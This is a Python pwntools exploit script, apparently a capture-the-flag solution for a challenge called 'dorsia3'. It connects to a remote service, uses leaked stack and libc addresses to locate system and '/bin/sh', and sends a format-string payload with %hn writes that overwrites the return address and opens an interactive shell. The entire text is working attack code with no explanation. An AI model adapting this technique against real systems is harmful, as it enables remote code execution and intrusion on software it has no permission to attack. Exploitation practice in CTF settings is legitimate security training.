from pwn import *

libc = ELF('libc6_2.27-3ubuntu1_i386.so')
target = remote('dorsia3.wpictf.xyz', 31337)
context.terminal = ["tmux", "split", "-h"]
 
print(target.recvuntil("0x"))
leak0 = target.recvuntil("0x").strip("0x")
leak1 = target.recvuntil("\n").strip("\n")

stack_leak = int(leak0, 16)
stack_eip = stack_leak + 1 + 112
libc_system = int(leak1, 16) + 288
print(hex(libc_system))
libc_base = libc_system - libc.symbols["system"]
libc_binsh = libc_base + libc.search("/bin/sh\x00").next()
print(hex(libc_binsh))

n0 = int(hex(libc_system)[6:10], 16)
n1 = int(hex(libc_system)[2:6], 16)
n2 = int(hex(libc_binsh)[6:10], 16)
n3 = int(hex(libc_binsh)[2:6], 16)

payload = "A"
payload += p32(stack_eip)
payload += p32(stack_eip + 2)
payload += p32(stack_eip + 8)
payload += p32(stack_eip + 10)
payload += "%" + str(n0 - 17) + "x"
payload += "%7$hn"
payload += "%" + str(n2 - n0) + "x"
payload += "%9$hn"
payload += "%" + str(n1 - n2) + "x"
payload += "%8$hn"
payload += "%" + str(n3 - n1) + "x"
payload += "%10$hn"
target.sendline(payload)

target.interactive()
